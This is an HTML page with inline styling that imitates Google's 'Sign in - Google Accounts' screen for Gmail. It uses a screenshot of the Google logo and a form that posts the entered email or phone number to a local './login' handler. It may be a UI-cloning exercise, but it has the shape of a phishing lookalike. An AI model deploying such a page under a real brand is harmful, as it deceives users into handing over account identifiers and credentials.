<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in - Google Accounts</title>
  <style>
    body {
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  background: #f2f2f2;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
}

.main-container {
  display: flex;
  width: 800px;
  background: #fff;
  border-radius: 20px;        /* smoother rounded edges */
  box-shadow: 0 4px 20px rgba(0,0,0,0.15);
  overflow: hidden;
}

/* LEFT SIDE */
.left-panel {
  flex: 1;
  padding: 50px 40px;
}

.left-panel img {
  margin-bottom: 0px;
  width: 50px;
  height: 50px;
}

.left-panel h1 {
  font-size: 26px;
  font-weight: 400;
  margin-bottom: 10px;
}

.left-panel p {
  font-size: 14px;
  color: #5f6368;
  line-height: 1.5;
}

/* RIGHT SIDE */
.right-panel {
  flex: 1;
  padding: 50px 40px;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
}

form {
  display: flex;
  flex-direction: column;
}

input {
  padding: 14px;
  font-size: 14px;
  border: 1px solid #dadce0;
  border-radius: 6px;
  margin-bottom: 15px;
}

input:focus {
  outline: none;
  border-color: #1a73e8;
  box-shadow: 0 0 0 1px #1a73e8;
}

.forgot,
.learn {
  color: #1a73e8;
  text-decoration: none;
  font-size: 14px;
  margin-bottom: 10px;
}

.forgot:hover,
.learn:hover {
  text-decoration: underline;
}

.guest-text {
  font-size: 12px;
  color: #5f6368;
  margin-top: 10px;
  margin-bottom: 4px;
}

.button-row {
  display: flex;
  justify-content: space-between;
  margin-top: 30px;
}

.create-btn {
  background: transparent;
  color: #1a73e8;
  border: none;
  font-size: 14px;
  cursor: pointer;
}

.next-btn {
  background: #1a73e8;
  color: white;
  border: none;
  padding: 10px 24px;
  border-radius: 6px;
  font-size: 14px;
  cursor: pointer;
}

.next-btn:hover {
  background: #1669c1;
}

/* FOOTER */
.footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 40px;
}

.footer-links a {
  margin-right: 20px;
  color: #5f6368;
  text-decoration: none;
  font-size: 12px;
}

.footer-links a:hover {
  text-decoration: underline;
}

.footer select {
  font-size: 12px;
  padding: 4px;
}

  </style>
</head>
<body>

  <div class="main-container">

    <div class="left-panel">
      <img src="Screenshot_2026-01-26_224339-removebg-preview.png" alt="Google logo" >
      <h1>Sign in</h1>
       <p>
        with your Google Account to continue to Gmail.
        This account will be available to other Google apps in the browser.
      </p>
    </div>

    <div class="right-panel">
      <form action="./login" method="post">

        <input
          type="text"
          name="username"
          placeholder="Email or phone"
          autocomplete="username"
          required
        >

        <a class="forgot" href="#">Forgot email?</a>

        <p class="guest-text">
          Not your computer? Use Guest mode to sign in privately.
        </p>
        <a class="learn" href="#">Learn more</a>

        <div class="button-row">
          <button type="button" class="create-btn">Create account</button>
          <button type="submit" class="next-btn">Next</button>
        </div>

       </form>

      <div class="footer">
        <div class="footer-links">
          <a href="#">Help</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
        </div>

        <select id="flex" name="fit">
          <option>English (United States)</option>
          <option>Español</option>
          <option>Français</option>
        </select>
      </div>
    </div>

  </div>

</body>
</html>
